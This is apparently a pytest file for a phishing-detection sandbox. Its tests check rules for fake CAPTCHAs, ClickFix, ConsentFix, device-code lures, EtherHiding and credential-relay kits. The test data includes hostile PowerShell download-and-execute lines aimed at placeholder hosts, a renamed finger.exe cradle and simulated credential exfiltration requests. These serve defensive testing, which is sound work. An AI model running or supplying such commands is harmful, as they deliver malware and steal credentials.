    data = _data(final_url, pages, **result)
    data.har_entries = list(har)
    data.dom_html = list(dom_html)
    data.requests = list(requests)
    data.allowlisted = set(allowlisted)
    return data


_TG_TOKEN = "123456789:AAHdqTcvCH1vGWJxfSeofSAs0K5PALDsaw"


def test_telegram_bot_exfil_fires_and_widget_is_quiet():
    har = [_req(f"https://api.telegram.org/bot{_TG_TOKEN}/sendMessage", "POST", post="chat_id=1")]
    assert "telegram_bot_exfil" in _hits(_cap("https://kit.example/", har=har))
    # Telegram login/share widget: telegram.org (not api.telegram.org), no Bot API path.
    widget = [_req("https://telegram.org/js/telegram-widget.js")]
    assert "telegram_bot_exfil" not in _hits(_cap("https://blog.example/", har=widget))


def test_discord_webhook_exfil_fires_and_normal_discord_is_quiet():
    hook = "https://discord.com/api/webhooks/123456789012345678/abcdefghijklmnopqrstuvwx"
    har = [_req(hook, "POST")]
    assert "discord_webhook_exfil" in _hits(_cap("https://kit.example/", har=har))
    normal = [_req("https://discord.com/app")]
    assert "discord_webhook_exfil" not in _hits(_cap("https://blog.example/", har=normal))


_MS_CLONE_HTML = (
    "<html><head><title>Sign in to your account</title></head><body>"
    '<form><input id="i0116" name="loginfmt"><input type="password" id="i0118">'
    '<input id="idSIButton9" type="submit"></form>'
    '<script>$Config={"urlGetCredentialType":"/common/GetCredentialType"};</script>'
    "</body></html>"
)


def test_ms_signin_clone_on_foreign_host_fires():
    dom = [{"url": "https://portal-login.example/", "html": _MS_CLONE_HTML}]
    assert "ms_signin_clone_foreign_host" in _hits(
        _cap("https://portal-login.example/", dom_html=dom)
    )  # noqa: E501


def test_ms_signin_button_on_third_party_is_quiet():
    """A real site with a 'Sign in with Microsoft' button: one marker only, no clone."""
    html = (
        '<html><body><a href="https://login.microsoftonline.com/">Sign in with Microsoft</a>'
        '<form><input type="password"></form></body></html>'
    )
    dom = [{"url": "https://app.example/login", "html": html}]
    assert "ms_signin_clone_foreign_host" not in _hits(
        _cap("https://app.example/login", dom_html=dom)
    )  # noqa: E501


def test_aitm_ms_paths_on_foreign_host_fires_and_real_ms_is_quiet():
    body = '$Config={"urlGetCredentialType":"x"}; i0116 idSIButton9'
    evil = [_req("https://evilproxy.example/common/oauth2/v2.0/authorize", body=body)]
    assert "aitm_ms_paths_foreign_host" in _hits(_cap("https://evilproxy.example/", har=evil))
    real = [_req("https://login.microsoftonline.com/common/oauth2/v2.0/authorize", body=body)]
    assert "aitm_ms_paths_foreign_host" not in _hits(
        _cap("https://login.microsoftonline.com/", har=real)
    )  # noqa: E501


def test_idp_cdn_assets_on_foreign_page_fires_and_real_idp_is_quiet():
    cdn = [_req("https://aadcdn.msftauth.net/shared/1.0/logo.png")]
    page = _page(
        "https://clone.example/", title="Sign in", text="Microsoft sign in", forms=[PASSWORD_FORM]
    )  # noqa: E501
    assert "idp_cdn_assets_foreign_page" in _hits(_cap("https://clone.example/", [page], har=cdn))
    ms_page = _page(
        "https://login.live.com/", title="Sign in", text="Microsoft", forms=[PASSWORD_FORM]
    )  # noqa: E501
    assert "idp_cdn_assets_foreign_page" not in _hits(
        _cap("https://login.live.com/", [ms_page], har=cdn)
    )  # noqa: E501


def test_ms_session_cookie_on_foreign_host_fires_and_real_ms_is_quiet():
    evil = [_req("https://evilproxy.example/", set_cookie=["ESTSAUTH=abc; Path=/"])]
    assert "ms_session_cookie_foreign_host" in _hits(_cap("https://evilproxy.example/", har=evil))
    real = [_req("https://login.microsoftonline.com/", set_cookie=["ESTSAUTH=abc"])]
    assert "ms_session_cookie_foreign_host" not in _hits(
        _cap("https://login.microsoftonline.com/", har=real)
    )  # noqa: E501


def test_oauth_error_redirect_abuse_fires_and_silent_sso_is_quiet():
    bounce = [
        {
            "from": "https://lure.example/",
            "to": "https://login.microsoftonline.com/common/oauth2/v2.0/authorize?prompt=none&client_id=x",
            "type": "js",
        },  # noqa: E501
        {
            "from": "https://login.microsoftonline.com/common/oauth2/v2.0/authorize",
            "to": "https://attacker.example/download/x?error=interaction_required",
            "type": "js",
        },  # noqa: E501
    ]
    assert "oauth_error_redirect_abuse" in _hits(
        _cap("https://attacker.example/download/x", redirects=bounce)
    )  # noqa: E501
    # Silent SSO: the error bounces back to the IdP's own SPA, not a foreign host.
    sso = [
        {
            "from": "https://app.example/",
            "to": "https://login.microsoftonline.com/common/oauth2/v2.0/authorize?prompt=none",
            "type": "js",
        },  # noqa: E501
        {
            "from": "https://login.microsoftonline.com/common/oauth2/v2.0/authorize",
            "to": "https://login.microsoftonline.com/error?error=login_required",
            "type": "js",
        },  # noqa: E501
    ]
    assert "oauth_error_redirect_abuse" not in _hits(_cap("https://app.example/", redirects=sso))


def test_illicit_consent_grant_fires_and_first_party_is_quiet():
    bad = "https://login.microsoftonline.com/common/oauth2/v2.0/authorize?client_id=11111111-2222-3333-4444-555555555555&scope=offline_access%20Mail.ReadWrite&prompt=consent"  # noqa: E501
    assert "illicit_consent_grant" in _hits(_cap("https://x.example/", navigations=[{"url": bad}]))
    fp = "https://login.microsoftonline.com/common/oauth2/v2.0/authorize?client_id=04b07795-8ddb-461a-bbee-02f9e1bf7b46&scope=offline_access%20Mail.ReadWrite&prompt=consent"  # noqa: E501
    assert "illicit_consent_grant" not in _hits(
        _cap("https://x.example/", navigations=[{"url": fp}])
    )  # noqa: E501


# ConsentFix (DE-M365-013/014): Azure CLI is first-party; its redirect is loopback.
_AZ_CLI = "04b07795-8ddb-461a-bbee-02f9e1bf7b46"
_CFX_AUTH = (
    "https://login.microsoftonline.com/organizations/oauth2/v2.0/authorize?client_id="
    + _AZ_CLI
    + "&response_type=code&redirect_uri=http%3A%2F%2Flocalhost%3A8400"
    "&scope=https%3A%2F%2Fmanagement.core.windows.net%2F.default"
)
_PASTE_TEXT = "Sign in, then copy the URL from your address bar and paste it here to continue."


def _cfx_page(url, text=_PASTE_TEXT, links=(_CFX_AUTH,), paste_box=True):
    page = _page(url, title="Verify your email", text=text)
    page["frames"][0]["links"] = list(links)
    page["frames"][0]["loose_text_inputs"] = 1 if paste_box else 0
    return page


def test_consentfix_paste_back_fires_and_ms_docs_are_quiet():
    url = "https://secure-verify.pages.dev/"
    hits = _hits(_cap(url, [_cfx_page(url)]))
    assert {"consentfix_authcode_paste_back", "firstparty_app_loopback_authorize"} <= hits
    # Microsoft's own docs page showing the same flow is not a lure.
    docs = "https://learn.microsoft.com/cli/azure/authenticate"
    assert not {"consentfix_authcode_paste_back", "firstparty_app_loopback_authorize"} & _hits(
        _cap(docs, [_cfx_page(docs)])
    )


def test_consentfix_url_in_inline_script_is_found():
    """The 'Sign in' button opens the authorize URL from script (JSON-escaped)."""
    url = "https://secure-verify.pages.dev/"
    escaped = _CFX_AUTH.replace("/", "\\/").replace("&", "\\u0026")
    dom = [{"url": url, "html": f"<script>btn.onclick=()=>window.open('{escaped}')</script>"}]
    data = _cap(url, [_cfx_page(url, links=())], dom_html=dom)
    assert "consentfix_authcode_paste_back" in _hits(data)


def test_consentfix_behind_allowlisted_wrapper_fires():
    """L2-02: the analyst submits a Safe Links-wrapped URL. The lure page's script holds
    the authorize URL; it must be judged by the frame it came from, not the wrapper."""
    wrapper = "https://nam12.safelinks.protection.outlook.com/?url=https%3A%2F%2Fsecure-verify.pages.dev%2F"  # noqa: E501
    lure = "https://secure-verify.pages.dev/"
    page = _cfx_page(lure, links=())
    page["frames"][0]["scripts"] = [{"sha256": "abc123", "inline": True}]
    data = _cap(lure, [page], redirects=[{"from": wrapper, "to": lure, "type": "http"}])
    data.result["url"] = wrapper
    data.scripts = {"abc123": f"document.getElementById('go').href='{_CFX_AUTH}';"}
    assert "consentfix_authcode_paste_back" in _hits(data)


def test_oauth_tutorial_page_is_medium_not_critical():
    """L2-02: a developer blog explaining the Azure CLI browser sign-in, including the
    'copy the URL and paste it' step, has no paste box: medium booster only."""
    url = "https://dev-notes.example.net/azure-cli-login"
    hits = _hits(_cap(url, [_cfx_page(url, paste_box=False)]))
    assert "firstparty_app_loopback_authorize" in hits
    assert "consentfix_authcode_paste_back" not in hits


def test_graph_command_line_tools_is_first_party():
    url = "https://secure-verify.pages.dev/"
    graph_cli = _CFX_AUTH.replace(_AZ_CLI, "14d82eec-204b-4c2f-b7e8-296a70dab67e")
    assert "consentfix_authcode_paste_back" in _hits(
        _cap(url, [_cfx_page(url, links=(graph_cli,))])
    )  # noqa: E501


def test_firstparty_loopback_without_paste_back_is_only_the_booster():
    url = "https://onboarding.example.net/"
    hits = _hits(_cap(url, [_cfx_page(url, text="Device setup guide")]))
    assert "firstparty_app_loopback_authorize" in hits
    assert "consentfix_authcode_paste_back" not in hits


def test_consentfix_needs_first_party_loopback_and_a_foreign_origin():
    url = "https://secure-verify.pages.dev/"
    third_party = _CFX_AUTH.replace(_AZ_CLI, "11111111-2222-3333-4444-555555555555")
    assert "firstparty_app_loopback_authorize" not in _hits(
        _cap(url, [_cfx_page(url, links=(third_party,))])
    )
    web_redirect = _CFX_AUTH.replace("http%3A%2F%2Flocalhost%3A8400", "https%3A%2F%2Fapp.example")
    assert "firstparty_app_loopback_authorize" not in _hits(
        _cap(url, [_cfx_page(url, links=(web_redirect,))])
    )
    # An analyst pasting a CLI sign-in URL: the chain starts on Microsoft.
    assert "firstparty_app_loopback_authorize" not in _hits(_cap(_CFX_AUTH))
    # An allowlisted developer site linking the flow.
    gh = "https://github.com/Azure/azure-cli/issues/1"
    assert "firstparty_app_loopback_authorize" not in _hits(
        _cap(gh, [_cfx_page(gh, text="Device setup guide")], allowlisted=["github.com"])
    )


# DE-M365-004 device-code phishing: the code below is a made-up placeholder.
_DEVICELOGIN = "https://microsoft.com/devicelogin"


def _dc_page(url, text, forms=(), links=(_DEVICELOGIN,)):
    page = _page(url, title="Document shared with you", text=text, forms=list(forms))
    page["frames"][0]["links"] = list(links)
    return page


def test_device_code_phishing_lure_fires_and_ms_help_is_quiet():
    url = "https://docs-share.pages.dev/"
    text = "To view the file, go to the link and enter this code: QX7T-K2MB9 to continue."
    hits = _hits(_cap(url, [_dc_page(url, text)]))
    assert {"device_code_phishing_lure", "device_code_handoff"} <= hits
    ms = "https://learn.microsoft.com/entra/identity/devices/device-login"
    assert not {"device_code_phishing_lure", "device_code_handoff"} & _hits(
        _cap(ms, [_dc_page(ms, text)])
    )


def test_it_help_page_describing_device_login_is_only_the_booster():
    """Closest FP: an IT help page tells staff to go to devicelogin and 'enter the code
    shown on your device', with a newsletter email box but no displayed code."""
    url = "https://it.university.example.net/help/teams-room"
    text = "Go to microsoft.com/devicelogin and enter the code shown on your device."
    news = {"action": "/subscribe", "fields": [{"type": "email"}]}
    hits = _hits(_cap(url, [_dc_page(url, text, forms=[news])]))
    assert "device_code_handoff" in hits
    assert "device_code_phishing_lure" not in hits


def test_device_code_share_pretext_with_email_gate_and_script_source():
    """The device-login URL in a script, plus an email-only gate on a share pretext."""
    url = "https://onedrive-files.example.net/"
    gate = {"action": "", "fields": [{"type": "email"}]}
    page = _dc_page(
        url, "A secure document was shared with you on OneDrive.", forms=[gate], links=()
    )  # noqa: E501
    page["frames"][0]["scripts"] = [{"sha256": "dc1", "inline": True}]
    data = _cap(url, [page])
    data.scripts = {"dc1": "window.open('https:\\/\\/aka.ms\\/devicelogin')"}
    assert "device_code_phishing_lure" in _hits(data)


def _rpc(
    host="bsc-dataseed.binance.org", to="0x1111111111111111111111111111111111111111", result=None
):
    body = (
        '{"jsonrpc":"2.0","id":1,"method":"eth_call","params":'
        '[{"to":"' + to + '","data":"0x6d4ce63c"},"latest"]}'
    )
    resp = '{"jsonrpc":"2.0","id":1,"result":"' + result + '"}' if result else ""
    return [_req(f"https://{host}/", "POST", post=body, body=resp)]


def _abi_string_result(text):
    """An eth_call return holding one ABI-encoded dynamic string."""
    data = text.encode()
    pad = b"\0" * ((32 - len(data) % 32) % 32)
    return "0x" + ((32).to_bytes(32, "big") + len(data).to_bytes(32, "big") + data + pad).hex()


# A benign stand-in for a contract-stored stage: ~1 KB of inert script text.
_STAGE = "console.log('stage marker');var a=[1,2,3];" * 24
_STAGE_B64 = __import__("base64").b64encode(_STAGE.encode()).decode()
_WORD_RESULT = "0x" + "00" * 31 + "2a"  # one 32-byte word: a price, a balance


def test_web3_rpc_from_non_wallet_page_fires_and_wallet_app_is_quiet():
    assert "web3_rpc_from_non_wallet_page" in _hits(
        _cap("https://compromised.example/", har=_rpc())
    )  # noqa: E501
    # A real dApp: the page used the wallet, so it is not EtherHiding.
    dapp = _cap(
        "https://dapp.example/", har=_rpc(), wallet_requests=[{"method": "eth_requestAccounts"}]
    )  # noqa: E501
    assert "web3_rpc_from_non_wallet_page" not in _hits(dapp)


def test_etherhiding_on_allowlisted_wordpress_fires():
    """R-07: EtherHiding runs on compromised legitimate sites, which are often allowlisted."""
    data = _cap("https://www.bigblog.com/", har=_rpc(), allowlisted=["bigblog.com"])
    assert "web3_rpc_from_non_wallet_page" in _hits(data)


def test_dapp_with_wallet_ui_is_not_etherhiding_without_fake_wallet():
    """With the fake wallet off (the default) wallet_requests never exists, so a dApp is
    recognised by its wallet UI: a connect-wallet button or a wallet-connector kit."""
    text_ui = _page("https://app.uniswap.org/", title="Uniswap", text="Swap tokens. Connect wallet")
    assert "web3_rpc_from_non_wallet_page" not in _hits(
        _cap("https://app.uniswap.org/", [text_ui], har=_rpc(), allowlisted=["uniswap.org"])
    )
    kit = _page("https://new-dex.example/", title="Swap")
    kit["frames"][0]["scripts"] = [
        {
            "src": "https://cdn.jsdelivr.net/npm/@walletconnect/ethereum-provider@2.11.0/dist/index.js"
        }
    ]
    assert "web3_rpc_from_non_wallet_page" not in _hits(
        _cap("https://new-dex.example/", [kit], har=_rpc())
    )  # noqa: E501


def test_fake_update_banner_on_dapp_is_not_critical():
    """R-03: an out-of-date-browser banner on a dApp that reads the chain is not ClearFake."""
    banner = "Your browser is out of date. Update Chrome for the best experience."
    used_wallet = _cap(
        "https://dapp.example/",
        [_page("https://dapp.example/", "DEX", banner)],
        har=_rpc(),
        wallet_requests=[{"method": "eth_requestAccounts"}],
    )  # noqa: E501
    assert "fake_browser_update" not in _hits(used_wallet)
    ui = _page("https://dapp.example/", "DEX", banner + " Connect wallet")
    assert "fake_browser_update" not in _hits(_cap("https://dapp.example/", [ui], har=_rpc()))
    # ClearFake: a compromised blog shows the overlay and reads the contract.
    blog = _page("https://www.bigblog.com/", "Blog", banner)
    clearfake = _cap("https://www.bigblog.com/", [blog], har=_rpc(), allowlisted=["bigblog.com"])
    assert "fake_browser_update" in _hits(clearfake)


# innerHTML/document.write markup counts toward exec.max_len but not code_max_len.
_MARKUP_EXEC = {"exec": {"count": 40, "max_len": 9000, "max_entropy": 4.8}}
_BIG_CODE = {
    "exec": {
        "count": 2,
        "max_len": 6000,
        "max_entropy": 5.4,
        "code_count": 2,
        "code_max_len": 6000,
        "code_max_entropy": 5.4,
    }
}  # noqa: E501


def test_price_widget_rpc_plus_innerhtml_is_quiet():
    """L2-01: a read-only chain widget (price ticker, ENS lookup) on a page that sets a
    lot of innerHTML is not 'payload executed': markup is not code."""
    data = _cap("https://news.example/", har=_rpc(result=_WORD_RESULT), jsapi=_MARKUP_EXEC)
    assert "etherhiding_payload_executed" not in _hits(data)


def test_rpc_string_result_executed_fires_on_allowlisted():
    """L2-01: the contract answers with a kilobyte string whose base64 layer is the code
    later passed to eval: linked, so no allowlist or lure condition applies."""
    jsapi = {"exec": {**_BIG_CODE["exec"], "code_samples": [_STAGE]}}
    data = _cap(
        "https://www.bigblog.com/",
        har=_rpc(result=_abi_string_result(_STAGE_B64)),
        jsapi=jsapi,
        allowlisted=["bigblog.com"],
    )  # noqa: E501
    web3 = build_facts(data)["web3"]
    assert web3["rpc_large_string_results"] == 1
    assert web3["rpc_result_linked_exec"] is True
    assert "_rpc_large_strings" not in web3
    assert "etherhiding_payload_executed" in _hits(data)


def test_etherhiding_payload_executed_fallback_and_small_answers():
    """Without a direct link: large string answer + 1 KB+ of code-only exec."""
    big = _rpc(result=_abi_string_result(_STAGE))
    assert "etherhiding_payload_executed" in _hits(
        _cap("https://compromised.example/", har=big, jsapi=_BIG_CODE)
    )
    # Word-sized answers (a dApp's page-load reads) never escalate, even with code exec.
    assert "etherhiding_payload_executed" not in _hits(
        _cap("https://compromised.example/", har=_rpc(result=_WORD_RESULT), jsapi=_BIG_CODE)
    )
    # On an allowlisted site the fallback also needs a lure page.
    blog = "https://www.bigblog.com/"
    bare = _cap(blog, har=big, jsapi=_BIG_CODE, allowlisted=["bigblog.com"])
    assert "etherhiding_payload_executed" not in _hits(bare)
    overlay = _page(blog, "Blog", "Your browser is out of date. Update Chrome")
    lured = _cap(blog, [overlay], har=big, jsapi=_BIG_CODE, allowlisted=["bigblog.com"])
    assert "etherhiding_payload_executed" in _hits(lured)


def test_large_string_answer_overrides_dapp_ui_and_iframe_wording_does_not_count():
    """A kilobyte string answer is EtherHiding's shape even on a page with wallet UI; and
    'connect wallet' inside a third-party iframe does not make the page a dApp."""
    dapp = _page("https://dapp.example/", "DEX", "Connect wallet")
    big = _rpc(result=_abi_string_result(_STAGE))
    assert build_facts(_cap("https://dapp.example/", [dapp], har=big))["web3"]["etherhiding_rpc"]
    assert not build_facts(_cap("https://dapp.example/", [dapp], har=_rpc()))["web3"][
        "etherhiding_rpc"
    ]  # noqa: E501
    page = _page("https://blog.example/", "Blog", "Recipes")
    page["frames"].append(
        {
            "url": "https://ads.example/w",
            "title": "",
            "text": "Connect wallet",
            "forms": [],
            "iframes": [],
        }
    )  # noqa: E501
    assert build_facts(_cap("https://blog.example/", [page], har=_rpc()))["web3"]["etherhiding_rpc"]


def test_web3_known_malicious_contract_fires():
    har = _rpc(to="0x8eac3198dd72f3e07108c4c7cff43108ad48a71c")
    assert "web3_known_malicious_contract" in _hits(_cap("https://x.example/", har=har))
    assert "web3_known_malicious_contract" not in _hits(_cap("https://x.example/", har=_rpc()))


def _clipcap(url, clip_text, pages=()):
    clip = [{"page": "p0", "api": "navigator.clipboard.writeText", "text": clip_text}]
    return _cap(url, pages, clipboard=clip)


def test_fake_captcha_clipboard_command_fires_and_real_captcha_is_quiet():
    page = _page(
        "https://verify.example/",
        title="Verify you are human",
        text="Verification ID 4821. I am not a robot.",
    )  # noqa: E501
    assert "fake_captcha_clipboard_command" in _hits(
        _clipcap("https://verify.example/", "cmd /c start calc", [page])
    )  # noqa: E501
    # Real reCAPTCHA page with no clipboard command.
    real = _page("https://signup.example/", title="Sign up", text="reCAPTCHA verification")
    assert "fake_captcha_clipboard_command" not in _hits(_cap("https://signup.example/", [real]))


def test_cloudflare_footer_is_not_fake_captcha():
    """R-10: every site behind Cloudflare prints its name and a Ray ID."""
    page = _page(
        "https://shop.example/",
        title="Shop",
        text="Performance & security by Cloudflare. Ray ID: 8a1b2c3d4e. Security check",
    )  # noqa: E501
    lure = build_facts(_cap("https://shop.example/", [page]))["lure"]
    assert lure["fake_captcha"] is False
    assert lure["verification_wording"] is False


def test_fake_captcha_needs_an_instruction_next_to_the_wording():
    wording = _page("https://v.example/", title="Verify you are human", text="Checking...")
    assert build_facts(_cap("https://v.example/", [wording]))["lure"]["fake_captcha"] is False
    told = _page(
        "https://v.example/",
        title="Verify you are human",
        text="Press and hold the Windows key, then copy the verification code",
    )  # noqa: E501
    assert build_facts(_cap("https://v.example/", [told]))["lure"]["fake_captcha"] is True


_TURNSTILE = [_req("https://challenges.cloudflare.com/turnstile/v0/api.js")]


def test_genuine_challenge_with_plain_command_is_not_fake_captcha():
    """R-10: a page that loaded real Turnstile, says 'verify you are human' and copies an
    ordinary command (no Run-dialog lure, no ClickFix trait) is not a fake CAPTCHA."""
    page = _page("https://portal.example/", title="Verify you are human", text="One moment")
    data = _cap(
        "https://portal.example/", [page], har=_TURNSTILE, clipboard=_clip("cmd /c start calc")
    )  # noqa: E501
    assert "fake_captcha_clipboard_command" not in _hits(data)


def test_genuine_challenge_does_not_hide_an_unambiguous_command():
    page = _page("https://portal.example/", title="Verify you are human", text="One moment")
    data = _cap(
        "https://portal.example/",
        [page],
        har=_TURNSTILE,
        clipboard=_clip('powershell -w hidden -c "irm x.example|iex"'),
    )  # noqa: E501
    assert "fake_captcha_clipboard_command" in _hits(data)


def test_filefix_command_disguised_as_path_fires_and_plain_command_is_quiet():
    filefix = 'powershell -NoP -W Hidden -c "iwr x.example|iex"            # C:\\\\Users\\\\Public\\\\HRPolicy.docx'  # noqa: E501
    assert "filefix_command_disguised_as_path" in _hits(_clipcap("https://share.example/", filefix))  # noqa: E501
    assert "filefix_command_disguised_as_path" not in _hits(
        _clipcap("https://docs.example/", "cmd /c dir C:\\Users")
    )  # noqa: E501


def test_fake_browser_update_fires_and_browser_update_org_is_quiet():
    page = _page(
        "https://news-blog.example/",
        title="News",
        text="Your browser is out of date. Update Chrome to continue.",
    )  # noqa: E501
    data = _cap(
        "https://news-blog.example/",
        [page],
        downloads=[{"sha256": "aa", "suggested_filename": "ChromeSetup.exe"}],
    )  # noqa: E501
    data.download_heads = {"aa": b"MZ\x90\x00"}
    assert "fake_browser_update" in _hits(data)
    # browser-update.org banner that only links to the vendor (vendor host, no download here).
    ok = _page("https://browser-update.org/", title="Update", text="Your browser is out of date")
    assert "fake_browser_update" not in _hits(_cap("https://browser-update.org/", [ok]))


_CRASH_TEXT = (
    "Your browser stopped abnormally. Security issues detected. "
    "Press Win + R, then Ctrl + V and Enter to repair your browser."
)  # noqa: E501


def test_crashfix_repair_lure_fires_and_vendor_crash_page_is_quiet():
    """DE-CFX-010: fake crash-repair popup plus a clipboard command."""
    page = _page("https://adblock-help.example/", title="Chrome", text=_CRASH_TEXT)
    data = _clipcap("https://adblock-help.example/", "cmd /c start calc", [page])
    assert "crashfix_repair_lure" in _hits(data)
    # A vendor's genuine help page about crashes, no clipboard command.
    help_page = _page(
        "https://support.google.com/chrome/answer/1",
        title="Fix Chrome crashes",
        text="If Chrome has crashed or stopped abnormally, restart it.",
    )  # noqa: E501
    assert "crashfix_repair_lure" not in _hits(
        _cap("https://support.google.com/chrome/answer/1", [help_page])
    )  # noqa: E501
    # Crash wording on a third-party blog with no command or paste instruction.
    blog = _page(
        "https://tech-news.example/",
        title="Why your browser crashed",
        text="Browser crashed? Security issues detected in old versions.",
    )  # noqa: E501
    assert "crashfix_repair_lure" not in _hits(_cap("https://tech-news.example/", [blog]))


@pytest.mark.parametrize(
    "text",
    [
        # finger.exe copied under another name to dodge rules keyed on "finger".
        "cmd /c copy C:\\Windows\\System32\\finger.exe %TEMP%\\ct.exe",
        "ct.exe probe@x.example | cmd",
    ],
)
def test_renamed_finger_cradle_is_unambiguous_clickfix(text):
    data = _data("https://x.example/", clipboard=_clip(text))
    assert build_facts(data)["clipboard"]["clickfix_unambiguous"] == 1
    assert "clickfix_clipboard_command" in _hits(data)


def test_smuggled_credential_page_fires_and_https_page_is_quiet():
    blob = _page("blob:https://host.example/uuid", forms=[PASSWORD_FORM])
    assert "smuggled_credential_page" in _hits(_cap("https://host.example/", [blob]))
    normal = _page("https://host.example/login", forms=[PASSWORD_FORM])
    assert "smuggled_credential_page" not in _hits(_cap("https://host.example/login", [normal]))


def test_ipfs_credential_page_fires_and_nft_metadata_is_quiet():
    cid = "bafybeigdyrzt5sfp7udm7hu76uh7y26nf3efuylqabf3oclgtqy55fbzdi"
    url = f"https://{cid}.ipfs.dweb.link/"
    page = _page(url, title="Sign in", forms=[PASSWORD_FORM])
    assert "ipfs_credential_page" in _hits(_cap(url, [page]))
    meta = _page(url, title="NFT", text="token metadata")
    assert "ipfs_credential_page" not in _hits(_cap(url, [meta]))


def test_client_side_ip_lookup_fires_with_context_and_is_quiet_alone():
    har = [_req("https://ip-api.com/json")]
    with_cmd = _cap(
        "https://lure.example/",
        har=har,
        clipboard=[{"page": "p0", "api": "x", "text": "powershell -enc " + "A" * 60}],
    )  # noqa: E501
    assert "client_side_ip_geo_lookup" in _hits(with_cmd)
    assert "client_side_ip_geo_lookup" not in _hits(_cap("https://store.example/", har=har))


def test_credential_relay_websocket_fires_and_bare_socket_is_quiet():
    frames = [{"url": "wss://relay.example/socket.io/", "direction": "sent", "event": "recieveid"}]
    brand = _page(
        "https://m365-clone.example/",
        title="Sign in to your account",
        text="Microsoft",
        forms=[PASSWORD_FORM],
    )  # noqa: E501
    assert "credential_relay_websocket" in _hits(
        _cap("https://m365-clone.example/", [brand], websocket_frames=frames)
    )  # noqa: E501
    plain = _page("https://chat.example/", title="Chat", text="support")
    assert "credential_relay_websocket" not in _hits(
        _cap("https://chat.example/", [plain], websocket_frames=frames)
    )  # noqa: E501


def test_credential_prompt_with_allowlisted_chat_socket_is_quiet():
    """L2-04: a support-chat or analytics widget socket is not a relay."""
    brand = _page(
        "https://m365-clone.example/",
        title="Sign in to your account",
        text="Microsoft",
        forms=[PASSWORD_FORM],
    )  # noqa: E501
    chat = [{"url": "wss://nexus-websocket-a.intercom.io/pubsub/x", "direction": "received"}]
    data = _cap(
        "https://m365-clone.example/", [brand], websocket_frames=chat, allowlisted=["intercom.io"]
    )  # noqa: E501
    assert "credential_relay_websocket" not in _hits(data)
    # The kit's own host is kept: relays often run on the phishing host itself.
    own = [{"url": "wss://m365-clone.example/socket.io/", "direction": "sent"}]
    assert "credential_relay_websocket" in _hits(
        _cap("https://m365-clone.example/", [brand], websocket_frames=own)
    )


def test_socketio_polling_relay_fires():
    """R-05: Socket.IO falls back to (or starts in) HTTP long-polling, which never shows
    up as WebSocket frames."""
    brand = _page(
        "https://m365-clone.example/",
        title="Sign in to your account",
        text="Microsoft",
        forms=[PASSWORD_FORM],
    )  # noqa: E501
    poll = "https://relay.example/socket.io/?EIO=4&transport=polling&t=Pabc"
    har = [_req(poll, "POST", post='42["recieveid","x"]\x1e42["send_to_browser",{}]')]
    data = _cap("https://m365-clone.example/", [brand], har=har)
    assert "credential_relay_websocket" in _hits(data)
    ws = build_facts(data)["websocket"]
    assert ws["socketio_polling"] == 1
    assert ws["polling_connections"][0]["events"] == ["recieveid", "send_to_browser"]


def test_socketio_polling_without_a_credential_prompt_or_to_allowlisted_is_quiet():
    poll = "https://relay.example/socket.io/?EIO=4&transport=polling"
    chat = _page("https://chat.example/", title="Support chat", text="How can we help?")
    assert "credential_relay_websocket" not in _hits(
        _cap("https://chat.example/", [chat], har=[_req(poll)])
    )  # noqa: E501
    brand = _page(
        "https://m365-clone.example/",
        title="Sign in to your account",
        text="Microsoft",
        forms=[PASSWORD_FORM],
    )  # noqa: E501
    widget = [_req("https://widget.intercom.io/socket.io/?EIO=4&transport=polling")]
    assert "credential_relay_websocket" not in _hits(
        _cap("https://m365-clone.example/", [brand], har=widget, allowlisted=["intercom.io"])
    )


def test_devtools_blocking_fires_with_context_and_is_quiet_alone():
    blocked = [{"kind": "devtools_key", "key": "F12"}, {"kind": "contextmenu"}]
    clip = [{"page": "p0", "api": "x", "text": 'powershell -w hidden -c "irm x|iex"'}]
    assert "devtools_blocking" in _hits(
        _cap("https://kit.example/", clipboard=clip, blocked_input=blocked)
    )  # noqa: E501
    assert "devtools_blocking" not in _hits(_cap("https://gallery.example/", blocked_input=blocked))


def test_wallet_drainer_signature_fires_and_dex_approval_is_quiet():
    drain = [{"method": "eth_signTypedData_v4", "primaryType": "PermitBatch"}]
    assert "wallet_drainer_signature" in _hits(
        _cap("https://claim-airdrop.example/", wallet_requests=drain)
    )  # noqa: E501
    # A real DEX on an allowlisted domain: a Permit on Uniswap is expected.
    ok = _cap("https://app.uniswap.org/", wallet_requests=drain, allowlisted=["uniswap.org"])
    assert "wallet_drainer_signature" not in _hits(ok)


def test_tycoon2fa_web_yara():
    kit = b'socket.on("recieveid",f);function tryfindingele(){};var x=".btn-blue-next-btn"'
    assert _yara("tycoon2fa_web").match(data=kit)
    assert not _yara("tycoon2fa_web").match(data=b"<form><input type=password></form>")


def test_crypto_decrypt_then_write_yara():
    page = b'var t=CryptoJS.AES.decrypt(d,k).toString();document.write("' + b"QUJD" * 300 + b'")'
    assert _yara("crypto_decrypt_then_write").match(data=page)
    assert not _yara("crypto_decrypt_then_write").match(data=b"CryptoJS.AES.decrypt(x,k)")


def test_extra_free_hosting_platforms_are_tenanted():
    from sandbox.analysis.domains import free_hosting, site

    assert free_hosting("kit.storage.dev") == "storage.dev"
    assert site("kit.storage.dev") == "kit.storage.dev"


# --- round 2: A3 request log, jsapi hooks, archive listing, cloaking -------------------

LOOSE_PW = {"action": "", "fields": [{"type": "password"}]}


def test_script_posted_credentials_fires_and_same_site_is_quiet():
    page = _page("https://kit.example/login", forms=[LOOSE_PW])
    reqs = [
        {
            "method": "POST",
            "type": "fetch",
            "url": "https://collector.net/x",
            "frame_url": "https://kit.example/login",
        }
    ]  # noqa: E501
    har = [_req("https://collector.net/x", "POST", post='{"email":"a@b.c","password":"x"}')]
    assert "script_posted_credentials" in _hits(
        _cap("https://kit.example/login", [page], har=har, requests=reqs)
    )  # noqa: E501
    same = [
        {
            "method": "POST",
            "type": "fetch",
            "url": "https://kit.example/api",
            "frame_url": "https://kit.example/login",
        }
    ]  # noqa: E501
    assert "script_posted_credentials" not in _hits(
        _cap("https://kit.example/login", [page], requests=same)
    )  # noqa: E501


@pytest.mark.parametrize("rtype", ["fetch", "", "other"])
def test_login_page_third_party_analytics_post_is_quiet(rtype):
    """R-02: an SPA login page (password field, no form action) that sends analytics or
    consent POSTs to a third party is not posting credentials."""
    url = "https://app.example/login"
    page = _page(url, title="Log in", forms=[LOOSE_PW])
    reqs = [
        {
            "method": "POST",
            "type": rtype,
            "url": "https://analytics.vendor.net/collect",
            "frame_url": url,
        }
    ]  # noqa: E501
    har = [_req("https://analytics.vendor.net/collect", "POST", post="v=2&tid=G-1&en=page_view")]
    assert "script_posted_credentials" not in _hits(_cap(url, [page], har=har, requests=reqs))


